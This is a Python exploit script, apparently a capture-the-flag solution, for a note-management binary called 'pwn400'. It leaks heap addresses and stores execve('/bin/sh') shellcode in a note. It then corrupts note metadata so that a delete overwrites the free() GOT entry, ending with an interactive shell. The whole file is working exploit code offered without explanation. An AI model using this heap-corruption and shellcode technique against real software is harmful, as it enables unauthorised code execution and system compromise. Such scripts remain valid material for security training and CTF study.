#!/usr/bin/env python
# -*- coding:utf-8 -*-
from zio import *
def pwn_server():
    io = zio("./pwn400")
    new='1'
    show='3'
    edit='4'
    delete='5'
    typr="b"
    content="minxin"
    #junk =  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
    shellcode = "\x90\x90\x90\x90\x90\x90"+"\xeb\x08"+"AAAA"+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x59\x50\x5a\xb0\x0b\xcd\x80"
    free_got = 0x0804A450

    io.read_until("option--->>")
    
    io.writeline(new)
    io.read_until('note title:')
    io.writeline("a1")
    io.read_until('note type:')
    io.writeline(typr)
    io.read_until('note content:')
    io.writeline(content)
    

    io.writeline(new)
    io.read_until('note title:')
    io.writeline("a2")
    io.read_until('note type:')
    io.writeline(typr)
    io.read_until('note content:')
    io.writeline(content)
    
    io.writeline(new)
    io.read_until('note title:')
    io.writeline("a3")
    io.read_until('note type:')
    io.writeline(typr)
    io.read_until('note content:')
    io.writeline(shellcode)
    
    io.writeline(show)
    io.readline()
    io.writeline("a1")
    io.read_until('location:')
    ptr1=int(io.read_until('\n'),16)

    io.writeline("3")
    io.readline()
    io.writeline("a2")
    io.read_until('location:')
    ptr2=int(io.read_until('\n'),16)

    io.writeline(show)
    io.readline()
    io.writeline("a3")
    io.read_until('location:')
    ptr3=int(io.read_until('\n'),16)

    edit_a2=l32(ptr2+108)+l32(ptr3+108)+l32(free_got-4)
    io.writeline(edit)
    io.read_until("note title:")
    io.writeline("a2")
    io.read_until("input content:")
    io.writeline(edit_a2)

    io.writeline(delete)
    io.read_until("note location:")
    io.writeline(hex(ptr2+108)[2::])
    print hex(ptr1),hex(ptr2),hex(ptr3)
    io.interact()
if __name__ == '__main__':
    pwn_server()
    print "attack done..."
